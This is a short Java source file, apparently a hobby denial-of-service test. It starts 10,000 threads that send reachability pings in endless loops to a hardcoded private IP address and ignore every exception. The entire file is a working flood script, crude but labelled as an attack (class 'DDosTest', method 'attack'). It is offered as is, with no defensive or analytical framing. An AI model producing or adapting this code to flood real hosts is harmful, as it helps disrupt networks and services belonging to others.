import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;
import java.io.*;
import java.net.*;

public class DDosTest {

    public static void main(String... args)   {
        for (int i = 0; i < 10000; i++) {
            DdosThread thread = new DdosThread();
            thread.start();
        }
    }

    public static class DdosThread extends Thread {

        private AtomicBoolean running = new AtomicBoolean(true);

        @Override
        public void run() {
            while (running.get()) {
                try {
                    attack();
                } catch (Exception e) {

                }
            }
        }

        public void attack() throws Exception {
            //Hardcoded for testing
            sendPingRequest("192.168.1.71");
        }
    }

    // Sends ping request to a provided IP address
    public static void sendPingRequest(String ipAddress)
            throws IOException
    {
        InetAddress geek = InetAddress.getByName(ipAddress);
        System.out.println("Sending Ping Request to " + ipAddress);
        if (geek.isReachable(5000))
            System.out.println("Host is reachable");
        else
            System.out.println("Sorry ! We can't reach this host");
    }
}
